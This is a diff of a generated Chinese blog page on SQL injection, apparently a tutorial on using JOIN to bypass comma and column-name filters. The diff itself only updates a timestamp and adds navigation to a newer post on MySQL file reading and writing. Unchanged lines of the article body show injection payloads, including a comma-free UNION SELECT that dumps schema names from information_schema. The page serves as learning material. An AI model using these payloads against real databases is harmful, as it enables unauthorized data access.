@@ -22,7 +22,7 @@
 <meta property="og:image" content="http://yoursite.com/2019/09/10/sqli-join-20190910/4.png">
 <meta property="og:image" content="http://yoursite.com/2019/09/10/sqli-join-20190910/5.png">
 <meta property="og:image" content="http://yoursite.com/2019/09/10/sqli-join-20190910/6.png">
-<meta property="og:updated_time" content="2019-09-10T05:56:23.266Z">
+<meta property="og:updated_time" content="2019-09-24T03:20:14.364Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="JOIN绕过逗号以及列名过滤">
 <meta name="twitter:description" content="正常使用join默认是内连，还分左连，右连，全连。这个知识点具体还是百度吧。语句类似如下select * from table1 join table2 on table1.id = table2.id这样会输出table1和table2中id相同的全部列。也可以选择只输出部分列select table1.name table2.xxx from table1 join table2 on tab">
@@ -181,6 +181,7 @@
     <div class="article-entry" itemprop="articleBody">
       
         <h1 id="正常使用"><a href="#正常使用" class="headerlink" title="正常使用"></a>正常使用</h1><p>join默认是内连，还分左连，右连，全连。这个知识点具体还是百度吧。<br>语句类似如下<br><code>select * from table1 join table2 on table1.id = table2.id</code><br>这样会输出table1和table2中id相同的全部列。也可以选择只输出部分列<br><code>select table1.name table2.xxx from table1 join table2 on table1.id = table2.id</code></p>
+<a id="more"></a>
 <h1 id="绕过逗号"><a href="#绕过逗号" class="headerlink" title="绕过逗号"></a>绕过逗号</h1><p>直接看图吧<br><code>select * from user where id = 1 union select * from ((select 1)A JOIN (select 2)B JOIN (select 3)C);</code></p>
 <img src="/2019/09/10/sqli-join-20190910/1.png">
 <p>可以在三个select中任选一个换成查找数据的payload<br><code>select * from user where id = 1 union select * from ((select group_concat(schema_name) from information_schema.schemata)A JOIN (select 2)B JOIN (select 3)C);</code></p>
@@ -304,6 +305,20 @@
 </article>
 
   
+<nav id="article-nav">
+  
+    <a href="/2019/09/24/mysql-read-write-file-20190924/" id="article-nav-newer" class="article-nav-link-wrap">
+      <i class="icon-circle-left"></i>
+      <div class="article-nav-title">
+        
+          Mysql读取/写入文件
+        
+      </div>
+    </a>
+  
+  
+</nav>
+
 
 <aside class="wrap-side-operation">
     <div class="mod-side-operation">
